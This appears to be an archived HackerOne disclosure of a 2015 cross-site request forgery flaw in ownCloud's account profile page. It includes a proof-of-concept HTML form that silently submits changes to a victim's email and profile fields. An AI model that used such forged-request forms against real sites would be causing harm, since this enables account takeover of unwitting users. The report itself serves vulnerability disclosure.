@@ -1,0 +1,49 @@
+ReportLink:https://hackerone.com/reports/83239
+WeaknessName:Cross-Site Request Forgery (CSRF)
+Reporter:https://hackerone.com/jaysonzabate
+ReportedTo:ownCloud(owncloud)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:11.09.2015 9:08:23
+
+Summary:
+
+Allowed an attacker to force a user to change profile details. (XCSRF)
+
+A CSRF attack would not be prevented by this countermeasure because the attacker forges a request through the user's web browser in which a valid session already exists. There is no mitigation of Cross-Site Request Forgery (XCSRF) in edit profiles at https://owncloud.com/account/ 
+
+
+The vulnerability resided in edit profile and allowed an attacker to force a user to change profile details. The attacker could employ a malicious web page with the  following HTML code and ask the user to click the submit form. then the user was not able to understand what was really happening.
+
+
+###Reproduction Instructions / Proof of Concept:
+```
+  <form action="https://owncloud.com/account/" method="POST">
+      <input type="hidden" name="ws&#95;plugin&#95;&#95;s2member&#95;profile&#95;email" value="asdasdwqkgei&#64;yahoo&#46;com" />
+      <input type="hidden" name="ws&#95;plugin&#95;&#95;s2member&#95;profile&#95;first&#95;name" value="test" />
+      <input type="hidden" name="ws&#95;plugin&#95;&#95;s2member&#95;profile&#95;last&#95;name" value="test" />
+      <input type="hidden" name="ws&#95;plugin&#95;&#95;s2member&#95;profile&#95;display&#95;name" value="test "/>
+      <input type="hidden" name="ws&#95;plugin&#95;&#95;s2member&#95;profile&#95;user&#95;type" value="Other" />
+      <input type="hidden" name="ws&#95;plugin&#95;&#95;s2member&#95;profile&#95;company" value="test" />
+      <input type="hidden" name="ws&#95;plugin&#95;&#95;s2member&#95;profile&#95;title" value="test" />
+      <input type="hidden" name="ws&#95;plugin&#95;&#95;s2member&#95;profile&#95;salutation" value="test" />
+      <input type="hidden" name="ws&#95;plugin&#95;&#95;s2member&#95;profile&#95;address&#95;1" value="test" />
+      <input type="hidden" name="ws&#95;plugin&#95;&#95;s2member&#95;profile&#95;city" value="test" />
+      <input type="hidden" name="ws&#95;plugin&#95;&#95;s2member&#95;profile&#95;state" value="test" />
+      <input type="hidden" name="ws&#95;plugin&#95;&#95;s2member&#95;profile&#95;country" value="test" />
+      <input type="hidden" name="ws&#95;plugin&#95;&#95;s2member&#95;profile&#95;employees" value="test;" />
+      <input type="hidden" name="ws&#95;plugin&#95;&#95;s2member&#95;profile&#95;planed&#95;users" value="asdasdwqkgei" />
+      <input type="hidden" name="ws&#95;plugin&#95;&#95;s2member&#95;profile&#95;phone&#95;number" value="test" />
+      <input type="hidden" name="ws&#95;plugin&#95;&#95;s2member&#95;profile&#95;file" value="" />
+      <input type="hidden" name="ws&#95;plugin&#95;&#95;s2member&#95;profile&#95;password1" value="" />
+      <input type="hidden" name="ws&#95;plugin&#95;&#95;s2member&#95;profile&#95;password2" value="" />
+      <input type="hidden" name="ws&#95;plugin&#95;&#95;s2member&#95;sc&#95;profile&#95;save" value="" />
+      <input type="hidden" name="ws&#95;plugin&#95;&#95;s2member&#95;profile&#95;save" value="" />
+      <input type="submit" value="Submit request" />
+    </form>
+```
+
+###Suggested fix:
+
+Using crumbs to protect your PHP API (Ajax) call from Cross-site request forgery (CSRF/XSRF) and other vulnerabilities.
